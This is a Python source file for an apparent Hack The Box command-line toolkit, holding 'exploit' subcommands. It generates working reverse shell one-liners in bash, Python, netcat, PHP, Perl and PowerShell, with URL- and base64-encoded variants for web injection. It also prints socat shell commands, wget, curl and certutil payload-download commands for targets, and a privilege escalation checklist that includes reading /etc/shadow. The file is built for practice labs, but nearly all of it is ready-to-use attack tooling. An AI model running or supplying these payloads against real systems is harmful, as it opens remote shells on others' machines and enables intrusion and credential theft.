"""Exploit helper commands"""

import click
import subprocess
from pathlib import Path
from rich.console import Console
from htb_cli.core.config_manager import ConfigManager
from htb_cli.utils import get_tun_ip

console = Console()


@click.group()
def exploit():
    """Exploitation helpers and reverse shell generators"""
    pass


@exploit.command()
@click.option('--port', default=4444, help='Port for reverse shell')
@click.option('--type', 'shell_type', 
              type=click.Choice(['bash', 'python', 'nc', 'php', 'perl', 'powershell']),
              default='bash', help='Shell type')
def shell(port, shell_type):
    """Generate reverse shell payload"""
    try:
        ip = get_tun_ip()
        if not ip:
            console.print("[red]✗ Could not detect VPN IP (tun0)[/red]")
            console.print("[dim]Make sure you're connected to HTB VPN[/dim]\n")
            return
        
        console.print(f"\n[cyan]Reverse Shell Payload[/cyan]")
        console.print(f"[dim]IP: {ip} | Port: {port} | Type: {shell_type}[/dim]\n")
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {ip} {port}",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }
        
        payload = shells.get(shell_type, shells['bash'])
        console.print(f"[green]{payload}[/green]\n")
        
        # URL encoded version for web exploits
        import urllib.parse
        encoded = urllib.parse.quote(payload)
        console.print(f"[cyan]URL Encoded:[/cyan]")
        console.print(f"[yellow]{encoded}[/yellow]\n")
        
        # Base64 encoded version
        import base64
        b64 = base64.b64encode(payload.encode()).decode()
        console.print(f"[cyan]Base64 Encoded:[/cyan]")
        console.print(f"[yellow]{b64}[/yellow]\n")
        
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        raise click.Abort()


@exploit.command()
@click.option('--port', default=4444, help='Port to listen on')
def listen(port):
    """Start a netcat listener"""
    try:
        console.print(f"\n[cyan]Starting listener on port {port}...[/cyan]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")
        
        subprocess.run(f"nc -lvnp {port}", shell=True)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Listener stopped[/yellow]\n")
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        raise click.Abort()


@exploit.command()
@click.option('--port', default=80, help='Port to serve on')
def serve(port):
    """Start a simple HTTP server in current directory"""
    try:
        console.print(f"\n[cyan]Starting HTTP server on port {port}...[/cyan]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")
        
        ip = get_tun_ip()
        if ip:
            console.print(f"[green]Server URL: http://{ip}:{port}/[/green]\n")
        
        subprocess.run(f"python3 -m http.server {port}", shell=True)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Server stopped[/yellow]\n")
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        raise click.Abort()


@exploit.command()
@click.argument('local_port', type=int)
@click.argument('target', required=False)
@click.argument('target_port', type=int, required=False)
def tunnel(local_port, target, target_port):
    """Create SSH tunnel for port forwarding"""
    try:
        config_mgr = ConfigManager()
        
        if not target:
            target_info = config_mgr.get('current_target')
            if not target_info:
                console.print("[red]✗ No target specified and no current target set[/red]")
                return
            target = target_info.get('ip')
        
        if not target_port:
            target_port = local_port
        
        console.print(f"\n[cyan]Creating SSH tunnel...[/cyan]")
        console.print(f"[dim]Local: localhost:{local_port} -> Remote: {target}:{target_port}[/dim]\n")
        
        cmd = f"ssh -L {local_port}:localhost:{target_port} user@{target}"
        console.print(f"[yellow]Command:[/yellow] {cmd}\n")
        
        subprocess.run(cmd, shell=True)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Tunnel closed[/yellow]\n")
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        raise click.Abort()


@exploit.command()
def upgrade():
    """Show commands to upgrade a basic shell"""
    console.print("\n[bold cyan]Shell Upgrade Techniques[/bold cyan]\n")
    
    console.print("[yellow]1. Python PTY:[/yellow]")
    console.print("   python -c 'import pty; pty.spawn(\"/bin/bash\")'")
    console.print("   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    
    console.print("[yellow]2. Fully Interactive Shell:[/yellow]")
    console.print("   # In reverse shell:")
    console.print("   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    console.print("   Ctrl+Z")
    console.print("   # In your terminal:")
    console.print("   stty raw -echo; fg")
    console.print("   # In reverse shell:")
    console.print("   export TERM=xterm-256color")
    console.print("   export SHELL=bash")
    console.print("   stty rows 38 columns 116\n")
    
    console.print("[yellow]3. Using Script:[/yellow]")
    console.print("   script /dev/null -c bash\n")
    
    console.print("[yellow]4. Using Socat:[/yellow]")
    console.print("   # On attacker:")
    console.print("   socat file:`tty`,raw,echo=0 tcp-listen:4444")
    console.print("   # On target:")
    console.print("   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444\n")
    
    console.print("[yellow]5. Using Expect:[/yellow]")
    console.print("   expect -c 'spawn /bin/bash; interact'\n")


@exploit.command()
@click.option('--file', help='File to download')
@click.option('--method', type=click.Choice(['wget', 'curl', 'python', 'powershell', 'certutil']),
              default='wget', help='Download method')
def download(file, method):
    """Generate file download commands for target"""
    try:
        ip = get_tun_ip()
        if not ip:
            console.print("[red]✗ Could not detect VPN IP (tun0)[/red]")
            return
        
        if not file:
            file = "file.txt"
        
        url = f"http://{ip}:8000/{file}"
        
        console.print(f"\n[cyan]File Download Commands[/cyan]")
        console.print(f"[dim]Attacker IP: {ip}[/dim]\n")
        
        console.print("[yellow]1. Start HTTP server on attacker machine:[/yellow]")
        console.print(f"   python3 -m http.server 8000\n")
        
        console.print(f"[yellow]2. Download on target ({method}):[/yellow]")
        
        commands = {
            'wget': f"wget {url}",
            'curl': f"curl -O {url}",
            'python': f"python -c 'import urllib;urllib.urlretrieve(\"{url}\", \"{file}\")'",
            'powershell': f"powershell -c \"Invoke-WebRequest -Uri {url} -OutFile {file}\"",
            'certutil': f"certutil -urlcache -f {url} {file}",
        }
        
        console.print(f"   [green]{commands[method]}[/green]\n")
        
        console.print("[yellow]Alternative methods:[/yellow]")
        for name, cmd in commands.items():
            if name != method:
                console.print(f"   [{name}] {cmd}")
        
        console.print()
        
    except Exception as e:
        console.print(f"[red]✗ Error: {e}[/red]")
        raise click.Abort()


@exploit.command()
def privesc():
    """Show privilege escalation checklist"""
    console.print("\n[bold cyan]Privilege Escalation Checklist[/bold cyan]\n")
    
    console.print("[yellow]Linux:[/yellow]")
    console.print("  • sudo -l")
    console.print("  • find / -perm -4000 -type f 2>/dev/null")
    console.print("  • find / -writable -type f 2>/dev/null | grep -v proc")
    console.print("  • cat /etc/crontab")
    console.print("  • ls -la /etc/cron.*")
    console.print("  • ps aux | grep root")
    console.print("  • netstat -tulpn")
    console.print("  • cat /etc/passwd")
    console.print("  • cat /etc/shadow")
    console.print("  • history")
    console.print("  • env")
    console.print("  • uname -a")
    console.print("  • cat /etc/*-release\n")
    
    console.print("[yellow]Windows:[/yellow]")
    console.print("  • whoami /priv")
    console.print("  • whoami /groups")
    console.print("  • net user")
    console.print("  • net localgroup administrators")
    console.print("  • systeminfo")
    console.print("  • wmic qfe list")
    console.print("  • schtasks /query /fo LIST /v")
    console.print("  • netstat -ano")
    console.print("  • reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated")
    console.print("  • reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n")
    
    console.print("[yellow]Tools:[/yellow]")
    console.print("  • LinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS")
    console.print("  • WinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS")
    console.print("  • pspy: https://github.com/DominicBreuker/pspy")
    console.print("  • GTFOBins: https://gtfobins.github.io/\n")
